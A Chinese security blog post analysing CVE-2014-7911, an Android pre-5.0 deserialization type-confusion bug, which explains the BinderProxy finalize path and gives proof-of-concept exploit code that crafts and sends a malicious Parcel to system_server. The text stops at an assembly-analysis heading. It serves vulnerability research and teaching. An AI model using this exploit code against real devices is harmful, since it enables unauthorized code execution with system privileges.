
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Hello! CytQ">
    <title>Android系统提权：CVE-2014-7911 - Hello! CytQ</title>
    <meta name="author" content="CytQ">
    
    
    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <meta name="description" content="本文内容：  因Android反序列化漏洞导致的Android本地提权 Android平台上的ROP：绕过DEP 绕过Android平台的ASLR Android Binder Java序列化与反序列化 Heap Spary  CVE-2014-7911 摘自NVD  luni/src/main/java/java/io/ObjectInputStream.java in the java.io.">
<meta name="keywords" content="漏洞,Android,Root,专栏-提权,CVE">
<meta property="og:type" content="blog">
<meta property="og:title" content="Android系统提权：CVE-2014-7911">
<meta property="og:url" content="http://imlzq.com/2018/09/28/cve-2014-7911/index.html">
<meta property="og:site_name" content="Hello! CytQ">
<meta property="og:description" content="本文内容：  因Android反序列化漏洞导致的Android本地提权 Android平台上的ROP：绕过DEP 绕过Android平台的ASLR Android Binder Java序列化与反序列化 Heap Spary  CVE-2014-7911 摘自NVD  luni/src/main/java/java/io/ObjectInputStream.java in the java.io.">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log1.jpeg">
<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/binder.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_assembly.png">
<meta property="og:updated_time" content="2018-10-12T07:02:10.758Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Android系统提权：CVE-2014-7911">
<meta name="twitter:description" content="本文内容：  因Android反序列化漏洞导致的Android本地提权 Android平台上的ROP：绕过DEP 绕过Android平台的ASLR Android Binder Java序列化与反序列化 Heap Spary  CVE-2014-7911 摘自NVD  luni/src/main/java/java/io/ObjectInputStream.java in the java.io.">
<meta name="twitter:image" content="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log1.jpeg">
    
    
        
    
    
        <meta property="og:image" content="http://imlzq.com/assets/images/headicon.png"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-pz4cc6y13wt2trzqa8l3n9v0yykr0sstdaheem7qj628nhjmhp9pfawvqawz.min.css">
    <!--STYLES END-->
    

    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


<header id="header" data-behavior="5">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">Hello! CytQ</a>
    </div>
    
        
            <a  class="header-right-icon "
                href="#about">
        
        
            <i class="fa fa-lg fa-global.avatar"></i>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="5">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/headicon.png" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">CytQ</h4>
                
                    <h5 class="sidebar-profile-bio"><p>Security Engineer<br>Android、移动安全、逆向、漏洞挖掘、渗透</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                            title="Home"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                            title="Tags"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                            title="Archives"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link open-algolia-search"
                             href="#search"
                            
                            title="Search"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-search" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Search</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="#about"
                            
                            title="About"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:cytlzq@gmail.com" target="_blank" rel="noopener" title="Mail">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Mail</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/atom.xml"
                            
                            title="RSS"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="5"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post" itemscope itemType="http://schema.org/BlogPosting">
    
    
        <div class="post-header main-content-wrap text-left">
    
        <h1 class="post-title" itemprop="headline">
            Android系统提权：CVE-2014-7911
        </h1>
    
    
        <div class="post-meta">
    <time itemprop="datePublished" datetime="2018-09-28T12:00:00+08:00">
	
		    Sep 28, 2018
    	
    </time>
    
</div>

    
</div>
    
    <div class="post-content markdown" itemprop="articleBody">
        <div class="main-content-wrap">
            <p>本文内容：</p>
<ul>
<li>因Android反序列化漏洞导致的Android本地提权</li>
<li>Android平台上的ROP：绕过DEP</li>
<li>绕过Android平台的ASLR</li>
<li>Android Binder</li>
<li>Java序列化与反序列化</li>
<li>Heap Spary</li>
</ul>
<p><strong>CVE-2014-7911</strong></p>
<p>摘自NVD</p>
<blockquote>
<p>luni/src/main/java/java/io/ObjectInputStream.java in the java.io.ObjectInputStream implementation in Android before 5.0.0 does not verify that deserialization will result in an object that met the requirements for serialization, which allows attackers to execute arbitrary code via a crafted finalize method for a serialized object in an ArrayMap Parcel within an intent sent to system_service, as demonstrated by the finalize method of android.os.BinderProxy, aka Bug 15874291.</p>
<p><strong>Source:</strong>  MITRE<br><strong>Description Last Modified:</strong>  12/15/2014</p>
</blockquote>
<p>POC: <a href="https://github.com/CytQ/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/CytQ/CVE-2014-7911_poc</a></p>
<a id="more"></a>
<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>Android5.0以下的ObjectInputStream在反序列化时没有校验该java对象是否可序列化。因此攻击者可精心构建一个不可序列化的对象以及恶意的成员变量。当该恶意对象被反序列化时会产生类型混淆（type confusion），使恶意的成员变量被当成本地代码的指针，从而执行shellCode</p>
<h3 id="Target：-android-os-BinderProxy"><a href="#Target：-android-os-BinderProxy" class="headerlink" title="Target： android.os.BinderProxy"></a>Target： android.os.BinderProxy</h3><p>这个类本身是不可序列化的，他有个成员变量mOrgue。在系统GC的时候，会调用它的finalize方法，这个方法会将该类的mOrgue参数强制转换为对象指针A，如果我们能控制mOrgue，就能控制接下来程序执行的逻辑了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以下代码不来自同一个类，核心内容拼接</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// BinderProxy</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		destroy();</span><br><span class="line">	&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">		<span class="keyword">super</span>.finalize();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Native。对应的实现为：android_os_BinderProxy_destroy</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Native层</span></span><br><span class="line"><span class="comment">// 初始化mOrgue</span></span><br><span class="line">gBinderProxyOffsets.mObject  = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</span><br><span class="line">gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	IBinder* b = (IBinder*)</span><br><span class="line">		env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    <span class="comment">// gBinderProxyOffsets.mOrgue 被强制转换为DeathRecipientList对象</span></span><br><span class="line">    <span class="comment">// 也就是说mOrgue在类型混淆后被处理成了对象指针this</span></span><br><span class="line">	DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">        env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">	LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">	env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 调用drl的decstrong方法。此时的this由攻击者控制</span></span><br><span class="line">	drl-&gt;decstrong((<span class="keyword">void</span>*)javaobjectforibinder);</span><br><span class="line">	b-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">	IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上文能看到，类型混淆后drl已经转交给攻击者控制。</p>
<p>DeathRecipientList继承自RefBase，desStrong的实现为：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// RefBase</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RefBase</span>:</span>:weakref_impl : <span class="keyword">public</span> RefBase::weakref_type</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mStrong;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mWeak;</span><br><span class="line">    RefBase* <span class="keyword">const</span>      mBase;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int32_t</span>    mFlags;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RefBase.cpp</span></span><br><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 攻击这个方法</span></span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mRefs是RefBase的第一个成员变量，RefBase是DeathRecipientList的父类。因此对象布局为先放置父类，然后放置自己的成员。对象中的方法不占空间，如果有虚函数会有一个虚函数表的地址（4字节放置在对象的最开始），然后放置成员变量。</p>
<blockquote>
<p>故mRefs变量的地址=DeathRecipientList地址+4 = mOrgue指针指向的地址+4</p>
</blockquote>
<p>因此refs的地址我们可控，refs-&gt;mBase（算偏移即可）亦可控，只要我们构造特殊的内存布局就可以通过refs-&gt;mBase-&gt;onLastStrongRef(id)执行任意代码</p>
<h2 id="POC验证"><a href="#POC验证" class="headerlink" title="POC验证"></a>POC验证</h2><p>POC：<a href="https://github.com/CytQ/CVE-2014-7911_poc" target="_blank" rel="noopener">https://github.com/CytQ/CVE-2014-7911_poc</a></p>
<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC 1"></a>POC 1</h3><p>安装APP，点击Hello World按钮后logcat会显示sparying日志，如下：</p>
<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log1.jpeg" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log1.jpeg"></p>
<p>当sparying显示到1900后，等待30秒，按home键返回桌面，再等30秒，点击任意APP，等待1~2分钟（这是为了sparying完后能触发一次gc）。手机重启，验证成功，显示如下：</p>
<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log2.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log2.png"></p>
<h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC 2"></a>POC 2</h3><ul>
<li>注释POC 1中的heap_spary_ex()函数以及expolit(int static_address)中的evilProxy.mOrgue = static_address;</li>
<li>运行程序，evilProxy.mOrgue = 0x1337beef // 该地址无意义</li>
</ul>
<p>当系统崩溃时，能拦截到如下的日志：</p>
<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log3.png" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/cve-2014-7911_log3.png"></p>
<p>此时的fault addr等于mOrgue，说明类型强转后跳转到的1337beef这个地址无效，验证成功</p>
<h2 id="Poc-2-攻击原理"><a href="#Poc-2-攻击原理" class="headerlink" title="Poc 2 攻击原理"></a>Poc 2 攻击原理</h2><h3 id="构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP-Chain的起始地址-验证POC时这里是一个随机无效地址"><a href="#构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP-Chain的起始地址-验证POC时这里是一个随机无效地址" class="headerlink" title="构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP Chain的起始地址.验证POC时这里是一个随机无效地址"></a>构建恶意BinderProxy对象，设置mOrgue字段的值为shellcode或ROP Chain的起始地址.验证POC时这里是一个随机无效地址</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> AAdroid.os;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BinderProxy</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mObject = <span class="number">0x1337beef</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> mOrgue = <span class="number">0x1337beef</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2、构建恶意BinderProxy并进行Binder跨进程通信。"><a href="#2、构建恶意BinderProxy并进行Binder跨进程通信。" class="headerlink" title="2、构建恶意BinderProxy并进行Binder跨进程通信。"></a>2、构建恶意BinderProxy并进行Binder跨进程通信。</h3><p>Binder通信的原理这里不再过多赘述，在以前的博客中有过详细介绍。这里只简单提一下流程：</p>
<blockquote>
<p>Android中存在Client和Server的概念，所有请求方都被称为Client，如PackageManager、ActivityManager。所有接收请求的服务方都被称为Server，如PackageManagerService、ActivityManagerService。他们本身就属于不同的进程，因此通信时属于跨进程通信，实现工具为Binder。</p>
<p>Server首先在ServiceManager中注册，也就是留下一个远端调用接口，用这个接口可以去获取Server的服务。Client再请求时，把自己的基本信息比如UID、PID等发送给Binder Driver传过去，并进入等待状态，此时传送的数据为Tran_data（可能不叫这个，具体的忘了）。Binder driver再携带请求方的基本信息发送Transaction给Server，Server接收到了之后判断权限，符合就返值。Driver把返回的值用Tran_reply的方式告诉Client，并结束这次通信。</p>
</blockquote>
<p>下面放出这张通俗易懂的神图</p>
<p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/binder.jpg" alt="https://raw.githubusercontent.com/CytQ/BlogImgs/master/Root/binder.jpg"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">expolit</span><span class="params">(<span class="keyword">int</span> static_address)</span> </span>&#123;</span><br><span class="line">        Context context = getBaseContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 构造bundle，把恶意BinderProxy打包，准备发送</span></span><br><span class="line">            Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">            AAdroid.os.BinderProxy evilProxy = <span class="keyword">new</span> AAdroid.os.BinderProxy();</span><br><span class="line">            evilProxy.mOrgue = static_address;</span><br><span class="line">            Log.e(<span class="string">"cve"</span>, <span class="string">"mOrgue: "</span> + static_address + <span class="string">""</span>); </span><br><span class="line">            bundle.putSerializable(<span class="string">"eatthis"</span>, evilProxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过反射获取UserManager，用他向System_Server发送恶意序列化数据</span></span><br><span class="line">            Class clIUserManager = Class.forName(<span class="string">"android.os.IUserManager"</span>);</span><br><span class="line">            Class[] umSubclasses = clIUserManager.getDeclaredClasses();</span><br><span class="line">            Log.e(<span class="string">"mylog"</span>, umSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line">            Class clStub = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Class c : umSubclasses) &#123;</span><br><span class="line">                Log.e(<span class="string">"mylog"</span>, <span class="string">"inner class: "</span> + c.getCanonicalName());</span><br><span class="line">                <span class="keyword">if</span> (c.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub"</span>)) &#123;</span><br><span class="line">                    clStub = c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 准备通信过程中必要的Transaction变量和数据</span></span><br><span class="line">            Field fTRANSACTION_setApplicationRestrictions =</span><br><span class="line">                    clStub.getDeclaredField(<span class="string">"TRANSACTION_setApplicationRestrictions"</span>);</span><br><span class="line">            fTRANSACTION_setApplicationRestrictions.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            TRANSACTION_setApplicationRestrictions =</span><br><span class="line">                    fTRANSACTION_setApplicationRestrictions.getInt(<span class="keyword">null</span>);</span><br><span class="line">			</span><br><span class="line">            UserManager um = (UserManager) context.getSystemService(Context.USER_SERVICE);</span><br><span class="line">            Field fService = UserManager.class.getDeclaredField(<span class="string">"mService"</span>);</span><br><span class="line">            fService.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object proxy = fService.get(um);</span><br><span class="line"></span><br><span class="line">            Class[] stSubclasses = clStub.getDeclaredClasses();</span><br><span class="line">            Log.e(<span class="string">"mylog"</span>, stSubclasses.length + <span class="string">" inner classes found"</span>);</span><br><span class="line">            clProxy = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">for</span> (Class c : stSubclasses) &#123;</span><br><span class="line">                Log.e(<span class="string">"mylog"</span>, <span class="string">"inner class: "</span> + c.getCanonicalName());</span><br><span class="line">                <span class="keyword">if</span> (c.getCanonicalName().equals(<span class="string">"android.os.IUserManager.Stub.Proxy"</span>)) &#123;</span><br><span class="line">                    clProxy = c;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取远端接口</span></span><br><span class="line">            Field fRemote = clProxy.getDeclaredField(<span class="string">"mRemote"</span>);</span><br><span class="line">            fRemote.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            mRemote = (IBinder) fRemote.get(proxy);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取请求方的基本信息，比如UID</span></span><br><span class="line">            UserHandle me = android.os.Process.myUserHandle();</span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            setApplicationRestrictions(context.getPackageName(), bundle, me.hashCode());</span><br><span class="line"></span><br><span class="line">            Log.i(<span class="string">"badserial"</span>, <span class="string">"waiting for boom here and over in the system service..."</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setApplicationRestrictions</span><span class="params">(String packageName, Bundle restrictions, <span class="keyword">int</span> userHandle)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">// data是发过去的数据，reply是返回的数据，都是序列化格式</span></span><br><span class="line">        android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">        android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将外部传入的信息“格式化”</span></span><br><span class="line">            _data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">            _data.writeString(packageName);</span><br><span class="line">            _data.writeInt(<span class="number">1</span>);</span><br><span class="line">            restrictions.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">            _data.writeInt(userHandle);</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 因为Parcel的数据会有一定的格式，因此我们先把恶意数据用Parcel格式化一次，</span></span><br><span class="line">            <span class="comment">// 接着把它格式完的值提出来，修改里面的指定字段。</span></span><br><span class="line">            <span class="comment">// 最后再放入一个新的Parcel中，就生成了一个格式合法但数据非法的恶意Parcel</span></span><br><span class="line">            <span class="keyword">byte</span>[] data = _data.marshall();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; <span class="keyword">true</span>; i++) &#123;</span><br><span class="line">                <span class="comment">// 恶意BinderProxy属于AAdroid</span></span><br><span class="line">                <span class="comment">// 正版BinderProxy属于Android</span></span><br><span class="line">                <span class="comment">// 在数组中把恶意对象伪造成正常对象</span></span><br><span class="line">                <span class="keyword">if</span> (data[i] == <span class="string">'A'</span> &amp;&amp; data[i + <span class="number">1</span>] == <span class="string">'A'</span> &amp;&amp; data[i + <span class="number">2</span>] == <span class="string">'d'</span> &amp;&amp; data[i + <span class="number">3</span>] == <span class="string">'r'</span>) &#123;</span><br><span class="line">                    data[i] = <span class="string">'a'</span>;</span><br><span class="line">                    data[i + <span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.e(<span class="string">"cve"</span>, Arrays.toString(data)); </span><br><span class="line">            <span class="comment">// 回收老Parcel，创建恶意Parcel</span></span><br><span class="line">            _data.recycle();</span><br><span class="line">            _data = Parcel.obtain();</span><br><span class="line">            _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 发送数据</span></span><br><span class="line">            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">            _reply.readException();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            _reply.recycle();</span><br><span class="line">            _data.recycle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>通过上面这几步就已完成恶意数据的发送，只要此时再触发一次GC，就能执行finalize方法，从而控制DeathRecipientList* drl这个指针。</p>
<h3 id="3、汇编分析"><a href="#3、汇编分析" class="headerlink" title="3、汇编分析"></a>3、汇编分析</h3><p>从/system/lib中pull出libutils.so，ida解析</p>
<p><strong>c++整体如下：</strong></p>
